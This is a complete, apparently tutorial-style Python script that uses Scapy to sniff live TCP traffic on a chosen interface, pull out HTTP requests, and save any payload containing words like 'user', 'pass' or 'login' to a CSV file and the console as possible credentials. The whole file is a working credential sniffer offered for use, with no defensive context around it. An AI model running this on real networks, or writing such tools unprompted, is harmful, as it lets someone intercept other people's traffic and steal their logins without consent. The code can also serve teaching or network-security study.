import csv
from datetime import datetime
from scapy.all import sniff
from scapy.layers.inet import TCP, IP
from scapy.layers.http import HTTPRequest

# -----------------------------------------------------------
# CONFIGURATION SECTION
# -----------------------------------------------------------

# Name of the CSV file that will store all captured packets
LOG_FILE = "packets_log.csv"


# -----------------------------------------------------------
# INITIALIZATION FUNCTIONS
# -----------------------------------------------------------

def initialize_log():
    """
    Create (or overwrite) the CSV log file and write the header row.
    This function ensures that our log file always starts cleanly
    and has the correct column headers for structured data storage.
    """
    with open(LOG_FILE, mode="w", newline="", encoding="utf-8") as file:
        writer = csv.writer(file)
        writer.writerow(["Timestamp", "Source IP", "Destination IP", "Host", "Path", "Possible Credentials"])


def log_packet(data):
    """
    Append a new packet record (list of values) to the CSV file.
    Each captured HTTP request will be written as a new row.
    """
    with open(LOG_FILE, mode="a", newline="", encoding="utf-8") as file:
        writer = csv.writer(file)
        writer.writerow(data)


# -----------------------------------------------------------
# PACKET PROCESSING LOGIC
# -----------------------------------------------------------

def process_packet(packet):
    """
    This function is automatically called for each sniffed packet.
    It checks whether the packet contains an HTTP request, extracts
    useful information (source IP, destination IP, host, and path),
    and logs it to both the console and the CSV file.

    If potential credentials (like username or password) are found
    in the packet payload, they are also displayed and saved.
    """

    # Only process packets that contain an HTTP request
    if packet.haslayer(HTTPRequest):
        # Extract network-layer details
        ip_layer = packet[IP]
        http_layer = packet[HTTPRequest]

        # Basic details
        src_ip = ip_layer.src                   # Source IP address
        dst_ip = ip_layer.dst                   # Destination IP address
        host = http_layer.Host.decode() if http_layer.Host else ""  # Hostname (e.g., www.example.com)
        path = http_layer.Path.decode() if http_layer.Path else ""  # Request path (e.g., /login)
        creds = ""  # Default: no credentials found

        # Attempt to extract any text data (payload) that might contain credentials
        if packet.haslayer(TCP) and hasattr(packet, "Raw"):
            try:
                # Decode the payload to readable text
                load = packet["Raw"].load.decode(errors="ignore")
                # Check for common credential keywords in HTTP data
                if any(keyword in load.lower() for keyword in ["user", "username", "pass", "login"]):
                    creds = load
            except Exception:
                # If decoding fails, just ignore that packet's raw data
                pass

        # Record the timestamp of the captured packet
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Save all extracted info into the CSV log file
        log_packet([timestamp, src_ip, dst_ip, host, path, creds])

        # Print details to the terminal for live monitoring
        print("\n=== HTTP Request Captured ===")
        print(f"Time        : {timestamp}")
        print(f"Source IP   : {src_ip}")
        print(f"Destination : {dst_ip}")
        print(f"Host        : {host}")
        print(f"Path        : {path}")

        # If credentials were detected, print them too
        if creds:
            print(f"\n⚠️  Possible Credentials Found:\n{creds}")


# -----------------------------------------------------------
# PACKET SNIFFING FUNCTION
# -----------------------------------------------------------

def sniffing(interface):
    """
    Start live packet sniffing on the specified network interface.

    Parameters:
        interface (str): Name of the network interface to sniff on
                         (e.g., 'en0', 'eth0', or 'Wi-Fi')

    The `filter="tcp"` ensures we only capture TCP traffic,
    and `store=False` prevents Scapy from storing all packets in memory.
    """
    print(f"[*] Starting packet sniffing on {interface} ...")
    sniff(iface=interface, store=False, prn=process_packet, filter="tcp")


# -----------------------------------------------------------
# MAIN EXECUTION
# -----------------------------------------------------------

if __name__ == "__main__":
    # Initialize CSV log file before starting the capture
    initialize_log()

    # Change "Wi-Fi" to your active network interface:
    #   - macOS example: "en0"
    #   - Linux example: "eth0" or "wlan0"
    #   - Windows example: "Ethernet"
    sniffing("Wi-Fi")
